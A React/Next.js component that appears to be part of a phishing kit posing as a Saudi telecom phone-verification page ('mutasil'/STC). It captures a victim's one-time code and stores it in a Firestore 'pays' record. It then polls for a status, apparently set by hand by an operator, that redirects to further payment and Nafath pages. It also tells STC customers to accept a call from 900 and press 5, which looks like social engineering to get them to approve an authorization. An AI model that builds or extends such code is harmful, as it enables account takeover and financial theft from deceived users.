"use client";

import type React from "react";
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { useRouter } from "next/navigation";
import { AlertCircle, Phone } from "lucide-react";
import { doc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { addData } from "@/lib/firebase";
import FullPageLoader from "@/components/loader";

export function PhoneVerificationForm() {
  const router = useRouter();

  const [visitorId, setVisitorId] = useState<string | null>(null);
  const [selectedProvider, setSelectedProvider] = useState("mutasil");
  const [verificationCode, setVerificationCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timeLeft, setTimeLeft] = useState(147);
  const [loading, setIsLoading] = useState(false);

  /* ------------------ Get visitor safely ------------------ */
  useEffect(() => {
    if (typeof window !== "undefined") {
      const v = localStorage.getItem("visitor");
      setVisitorId(v);
    }
  }, []);

  /* ------------------ Firestore listener ------------------ */
  useEffect(() => {
    if (!visitorId) return;

    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (snap) => {
      if (!snap.exists()) return;

      const userData = snap.data();

      if (userData.phoneApproval === "pending") setIsLoading(true);

      if (userData.phoneApproval === "otp") {
        window.location.href = "/payment/otp";
      }

      if (userData.phoneApproval === "approved") {
        window.location.href = "/payment/nafad";
      }

      if (userData.phoneApproval === "rejected") {
        setIsLoading(false);
        alert("رمز التحقق غير صحيح");
      }
    });

    return () => unsubscribe();
  }, [visitorId]);

  /* ------------------ Timer ------------------ */
  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs
      .toString()
      .padStart(2, "0")}`;
  };

  const handleVerificationCodeChange = (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setVerificationCode(value);
  };

  /* ------------------ Submit ------------------ */
  const handleSubmit = async () => {
    if (!visitorId || verificationCode.length !== 6) return;

    setIsSubmitting(true);

    await addData({
      id: visitorId,
      phoneOtp: verificationCode,
      phoneApproval: "pending",
    });

    await new Promise((r) => setTimeout(r, 2000));
    setIsSubmitting(false);
  };

  const isFormValid = verificationCode.length === 6;

  return (
    <div className="space-y-6">
      <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-8">
        {loading && <FullPageLoader />}

        {/* Logo */}
        <div className="text-center mb-8">
          <div className="text-2xl font-bold text-stone-900 mb-1">متاصيل</div>
          <div className="text-xs text-stone-500">mutasil</div>
        </div>

        {/* Info */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6 flex gap-3">
          <Phone className="w-5 h-5 text-blue-600 mt-0.5" />
          <p className="text-sm text-blue-900">
            تم إرسال رمز التحقق إلى هاتفك. الرجاء إدخاله في هذا الحقل.
          </p>
        </div>

        {/* Providers */}
        <div className="mb-6">
          <label className="block text-sm font-medium mb-4 text-right">
            اختر مزود الخدمة
          </label>

          <div className="space-y-3">
            {["mutasil", "stc"].map((provider) => (
              <label
                key={provider}
                className="flex items-center p-4 border-2 rounded-lg cursor-pointer"
                style={{
                  borderColor:
                    selectedProvider === provider ? "#16a34a" : "#e7e5e4",
                }}
              >
                <input
                  type="radio"
                  value={provider}
                  checked={selectedProvider === provider}
                  onChange={(e) => setSelectedProvider(e.target.value)}
                  className="w-4 h-4 accent-green-600"
                />
                <span className="mr-3 flex-1 text-right">
                  <div className="font-semibold">
                    {provider === "mutasil" ? "متاصيل" : "STC"}
                  </div>
                </span>
              </label>
            ))}
          </div>
        </div>

        {selectedProvider === "stc" && (
          <div className="bg-orange-50 border-r-4 border-orange-500 rounded-lg p-4 mb-6 flex gap-3">
            <AlertCircle className="w-5 h-5 text-orange-600 mt-0.5" />
            <p className="text-sm text-orange-900 text-right">
              عملاء STC: في حال تلقي مكالمة من 900 الرجاء قبولها واختيار الرقم 5
            </p>
          </div>
        )}

        {/* OTP */}
        <input
          type="text"
          inputMode="numeric"
          value={verificationCode}
          onChange={handleVerificationCodeChange}
          placeholder="000000"
          className="w-full px-4 py-3 border-2 border-stone-300 rounded-lg text-center text-2xl font-bold tracking-widest"
        />

        {/* Timer */}
        <div className="text-center mt-4 text-sm text-stone-600">
          إعادة الإرسال: {formatTime(timeLeft)}
        </div>

        {/* Submit */}
        <Button
          onClick={handleSubmit}
          disabled={!isFormValid || isSubmitting}
          className="w-full mt-6 bg-green-600 hover:bg-green-700 text-white h-12"
        >
          {isSubmitting ? "جاري التحقق..." : "تحقق"}
        </Button>
      </div>
    </div>
  );
}
